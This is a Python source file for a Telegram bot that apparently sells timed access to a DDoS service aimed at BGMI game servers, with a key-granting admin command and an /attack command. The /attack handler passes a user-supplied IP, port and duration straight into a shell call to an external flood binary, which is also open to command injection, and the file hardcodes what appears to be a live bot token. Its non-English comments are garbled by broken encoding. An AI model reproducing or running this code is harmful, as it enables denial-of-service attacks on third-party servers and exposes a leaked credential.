import asyncio
import time
import logging
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext

# рд╕реЗрдЯрдЕрдк рд▓реЙрдЧрд┐рдВрдЧ
logging.basicConfig(format="%(asctime)s - %(levelname)s - %(message)s", level=logging.INFO)

# рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди
TELEGRAM_BOT_TOKEN = '7555897511:AAGoAFosRrkVtMq2UnaKg1sKQkRDmIB0lws'
ADMIN_USER_ID = "7129010361"  # рдЕрдм рдпреЗ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдореЗрдВ рд╣реИ рддрд╛рдХрд┐ рддреБрд▓рдирд╛ рд╕рд╣реА рд╣реЛ
KEYS_FILE = 'keys.txt'

# Keys рд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдлрд╝рдВрдХреНрд╢рди
def load_keys():
    try:
        with open(KEYS_FILE) as f:
            return {line.split(":")[0]: int(line.split(":")[1]) for line in f}
    except FileNotFoundError:
        return {}

def save_keys(keys):
    with open(KEYS_FILE, 'w') as f:
        for user, expiry in keys.items():
            f.write(f"{user}:{expiry}\n")

keys = load_keys()
print("тЬЕ ЁЯФС Keys loaded successfully!")

# /start рдХрдорд╛рдВрдб
async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "ЁЯФе WELCOME TO ЁЯТ╕[Ravi_Op]тЪб DDOS\n"
        "ЁЯСС OWNER: @R_SDanger\n"
        "ЁЯОп SERVER: BGMI\n"
        "ЁЯЪА USE /attack TO START ATTACK"                  
    )
    print(f"тЬЕ /start used by {chat_id} ЁЯПБ")
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

# /genkey рдлрд┐рдХреНрд╕реНрдб рд╡рд░реНрдЬрди
async def genkey(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)  # рдЕрдм рд╕реНрдЯреНрд░рд┐рдВрдЧ рдореЗрдВ рдХрдиреНрд╡рд░реНрдЯ рдХрд┐рдпрд╛

    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="ЁЯЪл *рд╕рд┐рд░реНрдл рдПрдбрдорд┐рди рдЗрд╕ рдХрдорд╛рдВрдб рдХрд╛ рдпреВрдЬрд╝ рдХрд░ рд╕рдХрддрд╛ рд╣реИ!*", parse_mode='Markdown')
        print(f"тЭМ Non-admin {user_id} tried to use /genkey ЁЯЪ╖")
        return

    args = context.args
    if not args or len(args) != 2:
        await context.bot.send_message(chat_id=chat_id, text="тЪая╕П *рдпреВрд╕реЗрдЬ:* /genkey user_id рджрд┐рди", parse_mode='Markdown')
        print("тЪая╕П Incorrect usage of /genkey command тЪЩя╕П")
        return

    target_user = str(args[0])
    days = int(args[1])
    expiry_time = int(time.time()) + (days * 86400)

    keys[target_user] = expiry_time
    save_keys(keys)
    print(f"тЬЕ ЁЯФС Key generated for {target_user} for {days} days")

    await context.bot.send_message(chat_id=chat_id, text=f"тЬЕ *User {target_user} рдХреЛ {days} рджрд┐рди рдХрд╛ рдПрдХреНрд╕реЗрд╕ рдорд┐рд▓ рдЧрдпрд╛!* ЁЯОЙ", parse_mode='Markdown')

# /myinfo рдХрдорд╛рдВрдб (рдпреВрдЬрд░ рдЕрдкрдирд╛ рд╕реНрдЯреЗрдЯрд╕ рдЪреЗрдХ рдХрд░ рд╕рдХреЗ)
async def myinfo(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)

    if user_id not in keys or keys[user_id] < time.time():
        await context.bot.send_message(chat_id=chat_id, text="тЭМ *рддреЗрд░рд╛ рдПрдХреНрд╕реЗрд╕ рдЦрд╝рддрдо рд╣реЛ рдЧрдпрд╛ рдмреЗ! DM рдХрд░ @R_SDanger*", parse_mode='Markdown')
        print(f"тЭМ User {user_id} tried to check expired info ЁЯЪ╖")
        return

    remaining_time = keys[user_id] - int(time.time())
    days, hours, minutes = remaining_time // 86400, (remaining_time % 86400) // 3600, (remaining_time % 3600) // 60

    print(f"тЬЕ ЁЯУЭ User {user_id} checked info: {days} days left")
    await context.bot.send_message(chat_id=chat_id, text=f"ЁЯУЭ *рддреЗрд░рд╛ рд╕реНрдЯреЗрдЯрд╕:* \nтП│ *рдмрдЪрд╛ рд╣реБрдЖ рдЯрд╛рдЗрдо:* {days} рджрд┐рди, {hours} рдШрдВрдЯреЗ, {minutes} рдорд┐рдирдЯ\nЁЯФе *рдУрдирд░:* @R_SDanger", parse_mode='Markdown')

# рдЕрдЯреИрдХ рдкреНрд░реЛрд╕реЗрд╕
async def run_attack(chat_id, ip, port, duration, context):
    try:
        print(f"ЁЯЪА Starting attack on {ip}:{port} for {duration} seconds ЁЯТе")
        process = await asyncio.create_subprocess_shell(
            f"./LEGEND {ip} {port} {duration} 150",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"тЬЕ [stdout]\n{stdout.decode()}")
        if stderr:
            print(f"тЪая╕П [stderr]\n{stderr.decode()}")

    except Exception as e:
        print(f"тЪая╕П Error in attack: {str(e)} тЭМ")
        await context.bot.send_message(chat_id=chat_id, text=f"тЪая╕П *Error:* {str(e)}", parse_mode='Markdown')

    finally:
        print(f"тЬЕ Attack on {ip}:{port} completed ЁЯОп")
        await context.bot.send_message(chat_id=chat_id, text="тЬЕ *Attack Completed Successfully!* ЁЯОпЁЯФе", parse_mode='Markdown')

# /attack рдХрдорд╛рдВрдб (Unlimited Attack)
async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    args = context.args

    if user_id not in keys or keys[user_id] < time.time():
        await context.bot.send_message(chat_id=chat_id, text="ЁЯТА *рддреЗрд░рд╛ рдПрдХреНрд╕реЗрд╕ рдЦрддреНрдо рд╣реЛ рдЧрдпрд╛ рдмреЗ! DM рдХрд░ ┬╗ @R_SDanger*", parse_mode='Markdown')
        print(f"тЭМ User {user_id} tried to attack without access ЁЯЪ╖")
        return

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="ЁЯМЯ *рдпреВрд╕реЗрдЬ:* /attack ip port time", parse_mode='Markdown')
        print("тЪая╕П Incorrect usage of /attack command тЪЩя╕П")
        return

    ip, port, time_sec = args
    print(f"тЬЕ ЁЯЪА Attack launched by {user_id} on {ip}:{port} for {time_sec} sec")
    await context.bot.send_message(chat_id=chat_id, text=(
        f"ЁЯЪА *ЁЭЧФЁЭЧзЁЭЧзЁЭЧФЁЭЧЦЁЭЧЮ ЁЭЧЯЁЭЧФЁЭЧиЁЭЧбЁЭЧЦЁЭЧЫЁЭЧШЁЭЧЧ*\n"
        f"ЁЯОп *Target:* {ip}\n"
        f"ЁЯТе *Port:* {port}\n"
        f"тП│ *Time:* {time_sec} sec\n"
        f"ЁЯФе *Owner:* @R_SDanger"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, time_sec, context))

# рдмреЙрдЯ рд╢реБрд░реВ рдХрд░реЗрдВ
def main():
    print("ЁЯЪА Bot is starting... тЪб")
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("genkey", genkey))
    application.add_handler(CommandHandler("myinfo", myinfo))
    application.add_handler(CommandHandler("attack", attack))
    print("тЬЕ Bot is running... ЁЯОп")
    application.run_polling()

if __name__ == '__main__':
    main()